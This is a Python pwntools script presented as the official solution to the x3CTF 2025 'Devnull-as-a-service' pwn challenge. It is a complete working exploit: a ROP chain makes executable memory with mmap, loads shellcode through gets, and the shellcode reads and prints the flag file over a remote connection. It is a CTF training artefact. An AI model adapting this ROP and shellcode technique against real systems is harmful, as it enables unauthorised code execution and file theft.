#!/usr/bin/env python3

# x3CTF 2025
# Devnull-as-a-service: https://github.com/x3ctf/challenges-2025/tree/main/pwn/devnull-as-a-service

"""
Official Solution
"""

# ------------------
# Ookami
# Hackers Fight Club
# ------------------

# IMPORTS
from pwn import p64,shellcraft,context,asm,remote,constants
from argparse import ArgumentParser

# Parser configuration
parser = ArgumentParser()
parser.add_argument('host',type=str,help='Target host to exploit')
parser.add_argument('port',type=int,help='Target port to connect')
parser.add_argument('-v','--verbosity',dest='verbosity',action='store_true',help='Activate verbose output')

# Argument parsed
args = parser.parse_args()

"""
Context
"""

context.arch = 'amd64'

if args.verbosity:
    context.log_level = 'debug'


"""
Gadgets, Addresses, etc
"""

# Info for RWX sector to create
rwx_sector_start = 0x200000
rwx_sector_size = 0x100000

# Function adresses
mmap = 0x41aa30
gets = 0x405a20

# Gadgets
pop_rdi=0x413795
pop_rsi_rbp = 0x402acc # pop rsi ; pop rbp ; ret
pop_rdx_r12_rbp = 0x47d944 # pop rdx; or al, 0x5b; pop r12; pop rbp; ret;
pop_rcx = 0x44a3a3 # pop rcx; fiadd word ptr [rax]; add bh, dh; ret 0;
pop_rax = 0x42193c
jmp_rax = 0x40195e

"""
Payload creation
"""

# Fill buffer offset with junk
payload = 16 * b'd'

# ******************************
# mmap preparation and execution
# ******************************

#
# Loads RWX start address as first argument on rdi
#
payload += p64(pop_rdi)
payload += p64(rwx_sector_start)

#
# Loads RWX size as second argument on rsi
#
payload += p64(pop_rsi_rbp)
payload += p64(rwx_sector_size)
# Fills unnecesary rbp with junk
payload += 8*b'd' 

#
# Loads permissions flags as third argument on rdx
#
payload += p64(pop_rdx_r12_rbp)
payload += p64(constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC) # Same as p64(0x7)
# Fills unnecesary r12 with junk
payload += 8*b'd' 
# Fills unnecesary rbp with junk
payload += 8*b'd'

#
# Sets any valid address on rax registor so there aren't problems with next gadget 
#
payload += p64(pop_rax)
payload += p64(0x401e72)

#
# Loads memory map flags as fourth argument
#
payload += p64(pop_rcx)
payload += p64(constants.MAP_ANONYMOUS | constants.MAP_PRIVATE | constants.MAP_FIXED) # Same as p64(0x22)

#
# Redirect execution to mmap function from above ret
#
payload += p64(mmap)

# **********************************************
# Shellcode input on recently created rwx sector
# **********************************************

# Loads target adress to store standard input as first argument
payload += p64(pop_rdi)
payload += p64(rwx_sector_start)

# Redirects execution to gets function from above ret
payload += p64(gets)

# Once finished jumps to rwx sector
payload += p64(jmp_rax)

"""
Shellcode crafting
"""

# Flag path
FLAG_PATH = "/home/ctf/flag.txt"

# Safe memory adress to start wrtiting flag file content
FLAG_MEMORY = 0x280010

# **********************
# Crafting the shellcode
# **********************

# Push flag path string to stack
sc = shellcraft.pushstr(FLAG_PATH)

# Openat syscall with current dir file descriptor, file path adress (rsp) and read only mode (0) as parameters
sc += shellcraft.openat(0, "rsp", 0)
# It stores resultant file descriptor on rax

# Read syscall with file descriptor stored on rax, memory adress to store content and bytes to read from file as parameters
sc += shellcraft.read("rax", FLAG_MEMORY, 0x2e)

# Write syscall with stdout (1), memory address with content to write and bytes to write as parameters
sc += shellcraft.write(1, FLAG_MEMORY, 0x2e)
# It outputs on standard output the file content

# Assemble shellcode
shellcode = asm(sc)

"""
Explotation
"""

# Start connection
r = remote(args.host,args.port,ssl=True)

# Recieve banner
r.recvline()

# Send crafted payload
r.sendline(payload)

# Send crafted shellcode
r.sendline(shellcode)

# Recieve exact bytes of flag length
response = r.recv(0x2e)

# Terminate connection
r.close()

# Output flag
print()
print('Flag: '+response.decode())
